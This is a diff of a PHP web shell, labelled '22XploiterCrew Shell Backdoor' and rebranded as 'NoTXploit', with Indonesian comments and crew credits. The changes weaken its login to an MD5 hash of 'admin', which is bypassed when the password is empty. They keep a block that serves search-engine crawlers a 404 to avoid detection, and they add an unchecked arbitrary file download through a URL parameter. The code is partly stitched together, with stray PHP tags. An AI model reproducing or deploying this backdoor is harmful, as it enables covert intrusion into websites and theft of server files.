@@ -1,4 +1,9 @@
 <?php
+/*
+[ Tak semua kami ngotak sendiri ]
+Special thanks for Holiq@Indosec
+Collabs team 22XploiterCrew ft Indosec Coder Team
+*/
 session_start();
 error_reporting(0);
 set_time_limit(0);
@@ -9,25 +14,20 @@ set_time_limit(0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
 
-<?php
-session_start();
+$password 			= "21232f297a57a5a743894a0e4a801fc3";   // admin
+$color 				= "#00ff00";
+$default_action 	= 'FilesMan';
+$default_use_ajax 	= true;
+$default_charset 	= 'UTF-8';
 
-$password_hash = '$2y$10$b9tkoH5LcnS./JGPSLBDKeBK6Da1MlCBiSpcnLzm61XdmdruB5A46';
-$color = "#00ff00";
-$default_action = 'FilesMan';
-$default_use_ajax = true;
-$default_charset = 'UTF-8';
-
-// Cegah bot dengan user agent tertentu
-if (!empty($_SERVER['HTTP_USER_AGENT'])) {
-    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
-    if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
-        header('HTTP/1.0 404 Not Found');
-        exit;
-    }
+if(!empty($_SERVER['HTTP_USER_AGENT'])) {
+	$userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
+	if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+		header('HTTP/1.0 404 Not Found');
+		exit;
+	}
 }
 
-// Fungsi login
 function login_shell() {
 ?>
 <!DOCTYPE html>
@@ -144,49 +144,26 @@ function login_shell() {
     </div>
 </body>
 </html>
-
 <?php
-    exit;
+exit;
 }
-
-// Proses autentikasi
-if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
-    if (isset($_POST['password'])) {
-        // Verifikasi password menggunakan password_verify()
-        if (password_verify($_POST['password'], $password_hash)) {
-            // Jika password benar, set session
-            $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
-        } else {
-            // Jika salah, tampilkan halaman login
-            echo "<script>alert('Password salah!');</script>";
-            login_shell();
-        }
-    } else {
-        // Jika belum login, tampilkan halaman login
-        login_shell();
-    }
-}
-
-// Setelah login berhasil, halaman utama dapat diakses
-echo "Selamat datang! Anda telah login.";
-?>
-// Fitur download file (opsional)
-if (isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
-    @ob_clean();
-    $file = $_GET['file'];
-    if (file_exists($file)) {
-        header('Content-Description: File Transfer');
-        header('Content-Type: application/octet-stream');
-        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
-        header('Expires: 0');
-        header('Cache-Control: must-revalidate');
-        header('Pragma: public');
-        header('Content-Length: ' . filesize($file));
-        readfile($file);
-    } else {
-        echo "File tidak ditemukan.";
-    }
-    exit;
+if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
+if( empty($password) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $password) ) )
+	$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+else
+login_shell();
+if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
+	@ob_clean();
+	$file = $_GET['file'];
+	header('Content-Description: File Transfer');
+	header('Content-Type: application/octet-stream');
+	header('Content-Disposition: attachment; filename="'.basename($file).'"');
+	header('Expires: 0');
+	header('Cache-Control: must-revalidate');
+	header('Pragma: public');
+	header('Content-Length: ' . filesize($file));
+	readfile($file);
+	exit;
 }
 ?>
 <?php
@@ -333,13 +310,13 @@ if (isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download'
 	
 echo "
 <html>
-	<title>22XploiterCrew Shell Backdoor</title>
+	<title>NoTXploit Shell Backdoor</title>
 	<head>
 		<meta name='viewport' content='widht=device-widht, initial-scale=0.75'>
-		<link rel='icon' type='image/png' href='https://avatars3.githubusercontent.com/u/53482167?s=460&v=4'/>
-		<meta name='author' content='CodeXploit+Holiq'/>
-		<meta name='copyright' content='22XploiterCrew'/>
-		<meta name='description' content='Imutz Shell Backdoor'>
+		<link rel='icon' type='image/png' href='https://od.lk/s/NV8yMDEwODU3OTNf/ninja.png'/>
+		<meta name='author' content='./NoTXploit'/>
+		<meta name='copyright' content='NoTXploit'/>
+		<meta name='description' content='notfound'>
                 <meta name='theme-color' content='#000'>
 		<link rel='stylesheet' href='https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css'>
 		<link rel='stylesheet' href='https://use.fontawesome.com/releases/v5.7.2/css/all.css' >
@@ -513,8 +490,8 @@ echo "
 			</div>
 		</nav>
 		<div class=''>
-			<h1 class='text-center'><a href='https://www.google.com'>./NoTXploit</h1>
-			<center><p>Opportunities Always Come Every Day</a></p></center>
+			<h1 class='text-center'>4N0TXpl0it4</h1>
+			<center><p>Opportunities always come every day</p></center>
 			<hr/>";
 		//keluar
 		if (isset($_GET['keluar'])) {
@@ -1756,5 +1733,5 @@ if($ext == "php") {
 			}
 		echo '</table></div><hr/>';
 		echo "<a href='' class='scrollToTop'><i class='fas fa-arrow-up up'></i></a>";
-		echo '<center><small>Copyright all right reserved '.date('M-Y').' <a href="https://22xploitercrew.com">22XploiterCrew</a> Recode By ./NoTXploit</small></center>';
+		echo '<center><small>Copyright all right reserved '.date('M-Y').' <a href="https://22xploitercrew.com">22XploiterCrew</a> Recode By ./NoTxploit</small></center>';
 ?>
